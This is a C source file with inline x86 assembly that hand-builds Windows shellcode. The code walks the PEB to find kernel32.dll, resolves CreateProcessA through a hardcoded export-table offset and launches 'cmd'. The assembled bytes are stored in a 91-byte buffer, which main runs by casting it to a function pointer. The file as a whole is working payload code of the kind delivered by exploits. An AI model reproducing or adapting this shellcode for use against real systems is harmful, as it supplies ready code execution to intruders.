void shellcode_asm(void)
{
    __asm {
        nop
        nop
        nop
        nop                         ; (90) removed in real code
        // HMODULE hModule = GetModuleHandleW(L"kernel32.dll");
        xor    eax, eax             ; (33c0)
        mov    ebx, fs:[eax + 0x30] ; PEB (648b5830)
        mov    eax, [ebx+0x0c]      ; PEB->Ldr (8b430c)
        mov    ebx, [eax+0x14]      ; PEB->Ldr->InMemOrderModuleList.Flink (The EXE) (8b5814)
        mov    eax, [ebx]           ; pEntry = pEntry->Flink (ntdll.dll) (8b03)
        mov    ebx, [eax]           ; pEntry = pEntry->Flink (kernel32.dll) (8b18)
        mov    eax, [ebx+0x10]      ; kernel32.dll hModule (CodeBase) (8b4310)

        // FARPROC proc = GetProcAddress(hModule, "CreateProcessA");
        mov    ebx, [eax+0x3c]      ; pImageDosHeader->e_lfanew (8b583c)
        mov    ebx, [ebx+eax+0x78]  ; pImageHeader->OptionalHeader.DataDirectory->VirtualAddress (8b5c0378)
        mov    ebx, [ebx+eax+0x1c]  ; pImageExportDirectory->AddressOfFunctions (8b5c031c)
        sub    ebx, 0xFFFFFD68      ; pAddressOfFunctions[CreateProcessA] (81eb68fdffff)
        add    eax, [ebx+eax]       ; CreateProcessA (030403)

        // Memory allocation and initialization
        push   ebp                  ; save ebp (55)
        mov    ebp, esp             ; save esp (8bec)
        and    esp, 0xfffffff8      ; stack frame 8 bytes aligned (83e4f8)

        xor    ebx, ebx             ; (33db)
        lea    ecx, [ebx + 0x16]    ; (8d4b16)
clear:
        push   ebx                  ; (53)
        dec    ecx                  ; (49)
        cmp    ecx, ebx             ; (3bcb)
        jne    clear                ; (75fa)

        mov    [esp + 0x10], 0x44   ; lpStartupInfo->cb = sizeof(LPSTARTUPINFOA)(c644241044)

        push   esp                  ; lpProcessInformation (54)
        lea    ecx, [esp + 0x14]    ; (8d4c2414)
        push   ecx                  ; lpStartupInfo (51)
        push   ebx                  ; lpCurrentDirectory (53)
        push   ebx                  ; lpEnvironment (53)
        push   ebx                  ; dwCreationFlags (53)
        push   ebx                  ; bInheritHandles (53)
        push   ebx                  ; lpThreadAttributes (53)
        push   ebx                  ; lpProcessAttributes (53)
        jmp    cmd                  ; (eb07)
create_process:
        push   ebx                  ; lpApplicationName (53)
        call   eax                  ; call CreateProcessA (ffd0)
        mov    esp, ebp             ; restore esp (8be5)
        pop    ebp                  ; restore ebp (5d)
        ret                         ; (c3), remove and decrement the jmp offset
cmd:
        call   create_process       ; lpCommandLine (e8f4ffffff)
        nop                         ; application name
        nop
        nop
        nop
    }
}
const unsigned char buffer[91] = {
  0x33, 0xc0, 0x64, 0x8b, 0x58, 0x30, 0x8b, 0x43, 0x0c, 0x8b,
  0x58, 0x14, 0x8b, 0x03, 0x8b, 0x18, 0x8b, 0x43, 0x10, 0x8b,
  0x58, 0x3c, 0x8b, 0x5c, 0x03, 0x78, 0x8b, 0x5c, 0x03, 0x1c,
  0x81, 0xeb, 0x68, 0xfd, 0xff, 0xff, 0x03, 0x04, 0x03, 0x55,
  0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x33, 0xdb, 0x8d, 0x4b, 0x16,
  0x53, 0x49, 0x3b, 0xcb, 0x75, 0xfa, 0xc6, 0x44, 0x24, 0x10,
  0x44, 0x54, 0x8d, 0x4c, 0x24, 0x14, 0x51, 0x53, 0x53, 0x53,
  0x53, 0x53, 0x53, 0xeb, 0x07, 0x53, 0xff, 0xd0, 0x8b, 0xe5,
  0x5d, 0xc3, 0xe8, 0xf4, 0xff, 0xff, 0xff, 0x63, 0x6d, 0x64,
  0x00
};
void (*shellcode)(void) = (void(*)(void))&buffer[0];
int main(int argc, char **argv)
{
    shellcode();
    return 0;
}
